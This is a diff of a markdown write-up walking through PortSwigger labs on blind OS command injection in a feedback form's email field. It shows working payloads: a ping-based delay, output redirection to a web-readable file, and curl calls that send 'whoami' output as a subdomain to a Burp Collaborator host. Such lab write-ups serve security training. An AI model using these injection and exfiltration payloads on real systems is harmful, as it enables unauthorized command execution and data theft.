@@ -50,7 +50,7 @@ Finished happy hacking!
 **Analysis**  
 
 1) we have feedback form in site :  
-![alt text](image.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image.png)  
 
 2) To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.  
 
@@ -58,10 +58,10 @@ Finished happy hacking!
 
 1) submit form with data and intercept with burp suite and send request to repeater :   
 2) i tried to inject all form with ;whoami after data all fields response 200 only request that i add ;whomai to email back with 500  
-![alt text](image-1.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-1.png)  
 
 3) to solve challenge we need to make response late 10 sec and this can do with ping  `mmm;ping+-c+10+1.1.1.1;`:   
-![alt text](image-2.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-2.png)  
 Solved   
 
 Finished happy hacking!
@@ -71,7 +71,7 @@ Finished happy hacking!
 **Analysis**  
 
 1) we have feedback form in site :  
-![alt text](image.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image.png)  
 
 2) To solve the lab, execute the whoami command and retrieve the output.  
 
@@ -84,10 +84,10 @@ Finished happy hacking!
 4) inject `email field` with `||whoami>/var/www/images/flag.txt||`  
 
 5) when we try to open post in challenge it's send request to server to get an image   
-![alt text](image-3.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-3.png)  
 
 6) change filename parameter to flag.txt :   
-![alt text](image-4.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-4.png)  
 
 solved....!  
 
@@ -99,20 +99,20 @@ Finished happy hacking!
 
 1) go to feedback page and fill form and intercept data and send it to burp repeater:   
 
-![alt text](image-5.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-5.png)  
 
 2) in this challenge all access that we faced in pervious challenges are locked the way is to send request to burp collaborator .  
-![alt text](image-6.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-6.png)  
 
 3) click `get start ` and copy link to clipboard   
 
 4) in challenge description say we need to DNS lookup to Burp Collaborator.  
 
 5) i will use this payload `||curl+past_link_here` and click send .  
-![alt text](image-8.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-8.png)  
 
 6)go to collaborator tab and click `poll know` i find request with whoami output as a subdomain.   
-![alt text](image-7.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-7.png)  
 
 7)submit user name and challenge solved...
 
@@ -122,26 +122,26 @@ Finished happy hacking!
 **Steps to solve**  
 
 1) open feedback tab and submit a form click submit and intercept request with burp :   
-  ![alt text](image-9.png)  
+  ![alt text](/assets/image/Portswigger/commandi/part2/image-9.png)  
 
 2) send request to repeater and start modify values to know injected parameter :   
 
-![alt text](image-10.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-10.png)  
 
 3) email is injectable point   
 
 4) open burp collaborator and get started after that click copy to clipboard:  
-![alt text](image-11.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-11.png)  
 
 5) modifay email to execute `whoami` command as a subdomain from burp collaborator link :   
 
 >|**||curl+`whoami`.xcd9y37tu1ng3f3z0t03x195rwxnlg95.oastify.com||**  
 
 6) send request :   
-![alt text](image-12.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-12.png)  
 
 7) on collaborator tab click poll now whoami output back as subdomain and challenge solved :   
-![alt text](image-13.png)  
+![alt text](/assets/image/Portswigger/commandi/part2/image-13.png)  
 
 Finished happy hacking!
 
